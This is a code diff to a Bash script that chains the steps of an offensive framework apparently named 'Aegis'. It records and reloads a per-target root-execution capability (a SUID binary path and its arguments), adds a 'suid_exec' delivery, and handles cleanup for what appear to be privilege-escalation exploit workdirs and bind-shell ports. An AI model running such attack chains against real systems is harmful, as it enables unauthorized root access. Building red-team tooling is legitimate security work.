@@ -51,6 +51,23 @@ shell_quote() {
     printf "%q" "$1"
 }
 
+target_capability_id() {
+    local target="$1"
+
+    target="${target#*@}"
+    printf '%s\n' "$target" |
+        sed -E 's/[^A-Za-z0-9_.-]+/_/g'
+}
+
+capability_quote() {
+    local value="$1"
+
+    value="${value//\\/\\\\}"
+    value="${value//\"/\\\"}"
+    value="${value//$'\n'/}"
+    printf '"%s"' "$value"
+}
+
 chain_ssh_command() {
     local target="$1"
     local command="$2"
@@ -89,6 +106,86 @@ DEFERRED_SHELL_SESSION_AUTH_USERS=()
 DEFERRED_SHELL_SESSION_AUTH_PASSWORDS=()
 DEFERRED_CLEANUP_RAN="false"
 
+CAPABILITY_TARGET_ID=""
+CAPABILITY_DIR=""
+CAPABILITY_FILE=""
+
+write_root_exec_capability() {
+    local method="$1"
+    local path="$2"
+    local args="$3"
+    local chroot_path="${4:-}"
+
+    [[ "${PERSIST_TARGET_CAPABILITIES:-true}" == "true" ]] || return 0
+    [[ -n "$CAPABILITY_FILE" ]] || return 0
+    [[ -n "$method" && -n "$path" ]] || return 0
+
+    mkdir -p "$CAPABILITY_DIR"
+
+    {
+        printf '# Aegis target capability registry\n'
+        printf 'TARGET=%s\n' "$(capability_quote "${TARGET#*@}")"
+        printf 'UPDATED_AT=%s\n' "$(capability_quote "$(date -Is)")"
+        printf 'ROOT_EXEC_METHOD=%s\n' "$(capability_quote "$method")"
+        printf 'ROOT_EXEC_PATH=%s\n' "$(capability_quote "$path")"
+        printf 'ROOT_EXEC_ARGS=%s\n' "$(capability_quote "${args:--p}")"
+        printf 'ROOT_EXEC_CHROOT_PATH=%s\n' "$(capability_quote "$chroot_path")"
+    } > "$CAPABILITY_FILE"
+
+    record_metadata "capability_file=$CAPABILITY_FILE"
+    record_metadata "persisted_root_exec_method=$method"
+    record_metadata "persisted_root_exec_path=$path"
+    record_metadata "persisted_root_exec_args=${args:--p}"
+    record_metadata "persisted_root_exec_chroot_path=$chroot_path"
+}
+
+load_target_capabilities() {
+    local requested_target="$1"
+
+    [[ "${LOAD_TARGET_CAPABILITIES:-false}" == "true" ]] || return 0
+    [[ -f "$CAPABILITY_FILE" ]] || {
+        warn "Target capability file not found: $CAPABILITY_FILE"
+        return 0
+    }
+
+    local loaded_target=""
+    local loaded_method=""
+    local loaded_path=""
+    local loaded_args=""
+    local loaded_chroot_path=""
+
+    unset TARGET ROOT_EXEC_METHOD ROOT_EXEC_PATH ROOT_EXEC_ARGS ROOT_EXEC_CHROOT_PATH UPDATED_AT
+
+    # shellcheck disable=SC1090
+    source "$CAPABILITY_FILE"
+
+    loaded_target="${TARGET:-}"
+    loaded_method="${ROOT_EXEC_METHOD:-}"
+    loaded_path="${ROOT_EXEC_PATH:-}"
+    loaded_args="${ROOT_EXEC_ARGS:--p}"
+    loaded_chroot_path="${ROOT_EXEC_CHROOT_PATH:-}"
+
+    TARGET="$requested_target"
+    unset ROOT_EXEC_METHOD ROOT_EXEC_PATH ROOT_EXEC_ARGS ROOT_EXEC_CHROOT_PATH UPDATED_AT
+
+    if [[ -n "$loaded_target" && "$loaded_target" != "${TARGET#*@}" ]]; then
+        fail "Capability target mismatch: file=$loaded_target requested=${TARGET#*@}"
+    fi
+
+    if [[ -n "$loaded_method" && -n "$loaded_path" ]]; then
+        export AEGIS_ROOT_EXEC_METHOD="$loaded_method"
+        export AEGIS_ROOT_EXEC_PATH="$loaded_path"
+        export AEGIS_ROOT_EXEC_ARGS="$loaded_args"
+        export AEGIS_ROOT_EXEC_CHROOT_PATH="$loaded_chroot_path"
+
+        record_metadata "loaded_capability_file=$CAPABILITY_FILE"
+        record_metadata "loaded_root_exec_method=$AEGIS_ROOT_EXEC_METHOD"
+        record_metadata "loaded_root_exec_path=$AEGIS_ROOT_EXEC_PATH"
+        record_metadata "loaded_root_exec_args=$AEGIS_ROOT_EXEC_ARGS"
+        record_metadata "loaded_root_exec_chroot_path=$AEGIS_ROOT_EXEC_CHROOT_PATH"
+    fi
+}
+
 queue_deferred_shell_session_cleanup() {
     local step_index="$1"
     local session_input="$2"
@@ -100,7 +197,8 @@ queue_deferred_shell_session_cleanup() {
     [[ -n "$session_input" && -n "$session_transcript" && -n "$session_workdir" ]] || return 0
 
     case "$session_workdir" in
-        /tmp/aegis_dirtyfrag_* | /var/tmp/aegis_dirtyfrag_* | /dev/shm/aegis_dirtyfrag_*)
+        /tmp/aegis_dirtyfrag_* | /var/tmp/aegis_dirtyfrag_* | /dev/shm/aegis_dirtyfrag_* | \
+        /tmp/aegis_copyfail_* | /var/tmp/aegis_copyfail_* | /dev/shm/aegis_copyfail_*)
             ;;
         *)
             warn "Refusing deferred cleanup for unsafe shell session workdir: $session_workdir"
@@ -220,6 +318,10 @@ CHAIN_ID="$(date +%Y%m%d_%H%M%S)_${CHAIN_NAME}_$(random_string 6)"
 CHAIN_DIR="$FRAMEWORK_ROOT/runs/chains/$CHAIN_ID"
 mkdir -p "$CHAIN_DIR"
 
+CAPABILITY_TARGET_ID="$(target_capability_id "$TARGET")"
+CAPABILITY_DIR="${TARGET_CAPABILITY_DIR:-$FRAMEWORK_ROOT/runs/capabilities/$CAPABILITY_TARGET_ID}"
+CAPABILITY_FILE="${TARGET_CAPABILITY_FILE:-$CAPABILITY_DIR/root_exec.env}"
+
 METADATA_TXT="$CHAIN_DIR/metadata.txt"
 METADATA_JSON="$CHAIN_DIR/metadata.json"
 
@@ -230,6 +332,9 @@ record_metadata "chain_name=$CHAIN_NAME"
 record_metadata "target=$TARGET"
 record_metadata "started_at=$(date -Is)"
 record_metadata "defer_shell_session_cleanup=${CHAIN_DEFER_SHELL_SESSION_CLEANUP:-true}"
+record_metadata "target_capability_file=$CAPABILITY_FILE"
+
+load_target_capabilities "$TARGET"
 
 trap '
 run_deferred_chain_cleanup || true
@@ -268,6 +373,10 @@ for STEP in "${STEPS[@]}"; do
         STEP_TARGET="${TARGET#*@}"
     fi
 
+    if [[ "$DELIVERY" == "suid_exec" ]]; then
+        STEP_TARGET="${TARGET#*@}"
+    fi
+
     # Give each bind-shell step its own port to avoid collisions.
     if [[ "$DELIVERY" == bind_shell/* ]]; then
         export LPORT="$((4444 + STEP_INDEX))"
@@ -286,6 +395,11 @@ for STEP in "${STEPS[@]}"; do
 
         [[ -n "${AEGIS_SHELL_SESSION_TRANSCRIPT:-}" ]] ||
             fail "root_session delivery requires AEGIS_SHELL_SESSION_TRANSCRIPT from a previous step"
+    fi
+
+    if [[ "$DELIVERY" == "suid_exec" ]]; then
+        [[ -n "${AEGIS_ROOT_EXEC_PATH:-}" ]] ||
+            fail "suid_exec delivery requires AEGIS_ROOT_EXEC_PATH from a previous step"
     fi
 
     STEP_ENV_ASSIGNMENTS=()
@@ -348,6 +462,10 @@ for STEP in "${STEPS[@]}"; do
     SHELL_SESSION_PID=""
     SHELL_SESSION_ACTIVE=""
     SHELL_SESSION_WORKDIR=""
+    ROOT_EXEC_METHOD=""
+    ROOT_EXEC_PATH=""
+    ROOT_EXEC_ARGS=""
+    ROOT_EXEC_CHROOT_PATH=""
 
     if [[ -f "$LAST_METADATA" ]]; then
 
@@ -358,7 +476,7 @@ for STEP in "${STEPS[@]}"; do
         )"
 
         METADATA_TARGET_USER="$(
-            grep -E '^(target_user|username|user)=' "$LAST_METADATA" |
+            grep '^target_user=' "$LAST_METADATA" |
                 tail -n 1 |
                 cut -d= -f2- || true
         )"
@@ -412,7 +530,31 @@ for STEP in "${STEPS[@]}"; do
         )"
 
         SHELL_SESSION_WORKDIR="$(
-            grep '^dirtyfrag_workdir=' "$LAST_METADATA" |
+            grep -E '^(shell_session_workdir|dirtyfrag_workdir|copyfail_workdir)=' "$LAST_METADATA" |
+                tail -n 1 |
+                cut -d= -f2- || true
+        )"
+
+        ROOT_EXEC_METHOD="$(
+            grep '^root_exec_method=' "$LAST_METADATA" |
+                tail -n 1 |
+                cut -d= -f2- || true
+        )"
+
+        ROOT_EXEC_PATH="$(
+            grep '^root_exec_path=' "$LAST_METADATA" |
+                tail -n 1 |
+                cut -d= -f2- || true
+        )"
+
+        ROOT_EXEC_ARGS="$(
+            grep '^root_exec_args=' "$LAST_METADATA" |
+                tail -n 1 |
+                cut -d= -f2- || true
+        )"
+
+        ROOT_EXEC_CHROOT_PATH="$(
+            grep '^root_exec_chroot_path=' "$LAST_METADATA" |
                 tail -n 1 |
                 cut -d= -f2- || true
         )"
@@ -420,6 +562,7 @@ for STEP in "${STEPS[@]}"; do
         log "Parsed user from metadata: ${CREATED_USER:-${METADATA_TARGET_USER:-unset}}"
         log "Parsed password from metadata: ${CREATED_PASSWORD:+set}"
         log "Parsed shell session from metadata: ${SHELL_SESSION_TYPE:-unset}"
+        log "Parsed root exec method from metadata: ${ROOT_EXEC_METHOD:-unset}"
 
         if [[ -n "$CREATED_USER" ]]; then
             export USERNAME="$CREATED_USER"
@@ -458,6 +601,24 @@ for STEP in "${STEPS[@]}"; do
                 "$SHELL_SESSION_TRANSCRIPT" \
                 "$SHELL_SESSION_WORKDIR" \
                 "$SHELL_SESSION_PID"
+        fi
+
+        if [[ -n "$ROOT_EXEC_METHOD" && -n "$ROOT_EXEC_PATH" ]]; then
+            export AEGIS_ROOT_EXEC_METHOD="$ROOT_EXEC_METHOD"
+            export AEGIS_ROOT_EXEC_PATH="$ROOT_EXEC_PATH"
+            export AEGIS_ROOT_EXEC_ARGS="${ROOT_EXEC_ARGS:--p}"
+            export AEGIS_ROOT_EXEC_CHROOT_PATH="$ROOT_EXEC_CHROOT_PATH"
+
+            record_metadata "exported_root_exec_method=$AEGIS_ROOT_EXEC_METHOD"
+            record_metadata "exported_root_exec_path=$AEGIS_ROOT_EXEC_PATH"
+            record_metadata "exported_root_exec_args=$AEGIS_ROOT_EXEC_ARGS"
+            record_metadata "exported_root_exec_chroot_path=$AEGIS_ROOT_EXEC_CHROOT_PATH"
+
+            write_root_exec_capability \
+                "$AEGIS_ROOT_EXEC_METHOD" \
+                "$AEGIS_ROOT_EXEC_PATH" \
+                "$AEGIS_ROOT_EXEC_ARGS" \
+                "$AEGIS_ROOT_EXEC_CHROOT_PATH"
         fi
 
     fi
